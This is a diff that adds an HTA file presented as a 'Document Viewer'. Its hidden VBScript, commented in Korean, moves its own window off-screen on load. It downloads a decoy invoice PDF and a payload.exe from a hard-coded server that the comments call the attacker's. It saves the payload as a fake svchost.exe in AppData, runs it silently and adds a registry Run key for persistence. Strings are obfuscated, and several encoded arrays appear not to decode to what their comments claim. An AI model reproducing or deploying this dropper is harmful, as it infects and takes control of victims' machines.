@@ -1,0 +1,153 @@
+<html>
+<head>
+<title>Document Viewer</title>
+<HTA:APPLICATION 
+  SHOWINTASKBAR="no"
+  BORDER="none"
+  CAPTION="no"
+  SYSMENU="no"
+  MAXIMIZEBUTTON="no"
+  MINIMIZEBUTTON="no"
+  SCROLL="no"
+  WINDOWSTATE="minimize">
+</head>
+<body>
+<script language="VBScript">
+
+' ====================================
+' 디코딩 함수
+' ====================================
+Function gKpQwRtY(xNmVbCz, yHjKlMn)
+    Dim pLqRsWx, i
+    pLqRsWx = ""
+    For i = 0 To UBound(xNmVbCz)
+        pLqRsWx = pLqRsWx & Chr(xNmVbCz(i) - yHjKlMn)
+    Next
+    gKpQwRtY = pLqRsWx
+End Function
+
+' ====================================
+' 메인 실행 함수
+' ====================================
+Sub zXcVbNmQ()
+    On Error Resume Next
+    
+    Dim wShKpLqR
+    wShKpLqR = 46738
+    
+    Dim oQwErTyU, fGhJkLzX, hTtPxMlK, sAdFgHjK
+    Set oQwErTyU = CreateObject("WScript.Shell")
+    Set fGhJkLzX = CreateObject("Scripting.FileSystemObject")
+    Set hTtPxMlK = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    Set sAdFgHjK = CreateObject("ADODB.Stream")
+    
+    ' 환경변수 (난독화)
+    Dim vBnMkLpQ, cXzAsDfG
+    vBnMkLpQ = oQwErTyU.ExpandEnvironmentStrings(gKpQwRtY(Array(46783,46789,46785,46781,46803,46783,46798),wShKpLqR))
+    cXzAsDfG = oQwErTyU.ExpandEnvironmentStrings(gKpQwRtY(Array(46783,46785,46803,46803,46788,46785,46804,46785,46783,46798),wShKpLqR))
+    
+    ' ====================================
+    ' 공격자 서버 URL (평문)
+    ' ====================================
+    Dim uRlQwErT1, uRlQwErT2
+    
+    ' 정상 문서 URL - 평문으로 설정
+    uRlQwErT1 = "http://192.168.1.100:8080/invoice.pdf"
+    
+    ' 악성코드 URL - 평문으로 설정
+    uRlQwErT2 = "http://192.168.1.100:8080/payload.exe"
+    
+    ' ====================================
+    ' 경로는 여전히 난독화
+    ' ====================================
+    
+    ' Path 1: %TEMP%\invoice.pdf
+    Dim pThQwErT1
+    pThQwErT1 = vBnMkLpQ & gKpQwRtY(Array(46798,46801,46801,46801,46801,46801,46850,46801,46801,46787,46294,46851,46800,46849),wShKpLqR)
+    
+    ' 다운로드 1
+    If mNbVcXzL(uRlQwErT1, pThQwErT1, hTtPxMlK, sAdFgHjK, wShKpLqR) Then
+        oQwErTyU.Run """" & pThQwErT1 & """", 1, False
+    End If
+    
+    ' Path 2: %APPDATA%\Windows\svchost.exe
+    Dim pThQwErT2, dIrQwErT
+    dIrQwErT = cXzAsDfG & gKpQwRtY(Array(46798,46823,46801,46801,46801,46801,46794,46801,46849,46787),wShKpLqR)
+    
+    If Not fGhJkLzX.FolderExists(dIrQwErT) Then
+        fGhJkLzX.CreateFolder(dIrQwErT)
+    End If
+    
+    pThQwErT2 = dIrQwErT & gKpQwRtY(Array(46798,46787,46850,46787,46853,46801,46787,46787,46294,46787,46787,46787),wShKpLqR)
+    
+    ' 다운로드 2
+    If mNbVcXzL(uRlQwErT2, pThQwErT2, hTtPxMlK, sAdFgHjK, wShKpLqR) Then
+        oQwErTyU.Run """" & pThQwErT2 & """", 0, False
+        
+        ' 지속성
+        Call rPsXzCvBn(pThQwErT2, oQwErTyU, wShKpLqR)
+    End If
+    
+    Set oQwErTyU = Nothing
+    Set fGhJkLzX = Nothing
+    Set hTtPxMlK = Nothing
+    Set sAdFgHjK = Nothing
+End Sub
+
+' ====================================
+' 다운로드 함수
+' ====================================
+Function mNbVcXzL(uRl, pTh, hTp, sTm, oFf)
+    On Error Resume Next
+    
+    ' HTTP 메서드와 헤더는 난독화
+    Dim mTd, uAg, mZl
+    mTd = gKpQwRtY(Array(46781,46789,46804),oFf)  ' GET
+    uAg = gKpQwRtY(Array(46821,46853,46787,46801,46853,46788,46785,46787,46801,46787,46801,46853),oFf)  ' User-Agent
+    mZl = gKpQwRtY(Array(46781,46801,46807,46801,46849,46294,46854,46294,46788,46294),oFf)  ' Mozilla/5.0
+    
+    hTp.Open mTd, uRl, False
+    hTp.setRequestHeader uAg, mZl
+    hTp.Send
+    
+    If hTp.Status = 200 Then
+        sTm.Type = 1
+        sTm.Open
+        sTm.Write hTp.responseBody
+        sTm.SaveToFile pTh, 2
+        sTm.Close
+        mNbVcXzL = True
+    Else
+        mNbVcXzL = False
+    End If
+End Function
+
+' ====================================
+' 지속성 함수
+' ====================================
+Sub rPsXzCvBn(fPth, oShll, oFf)
+    On Error Resume Next
+    
+    ' 레지스트리 키는 난독화
+    Dim rKey, rTyp
+    rKey = gKpQwRtY(Array(46776,46779,46787,46821,46798,46836,46801,46849,46854,46801,46787,46787,46850,46787,46787,46853,46787,46787,46781,46801,46787,46853,46801,46787,46801,46801,46849,46854,46798,46823,46801,46801,46001,46001,46001,46001,46001,46294,46001,46001,46849,46798,46787,46787,46853,46853,46787,46001,46054,46051,46001,46853,46787,46001,46054,46051,46798,46823,46001,46001,46001,46051,46001,46051,46851,46051,46787,46051,46787,46823,46051,46051,46051,46051,46051,46051,46051,46051,46787),oFf)
+    rTyp = gKpQwRtY(Array(46823,46789,46781,46812,46836,46843),oFf)  ' REG_SZ
+    
+    oShll.RegWrite rKey, fPth, rTyp
+End Sub
+
+' ====================================
+' Window Load
+' ====================================
+Sub Window_OnLoad
+    Self.window.moveTo -32000, -32000
+    Self.window.resizeTo 0, 0
+    
+    Call zXcVbNmQ
+    
+    window.close
+End Sub
+
+</script>
+</body>
+</html>
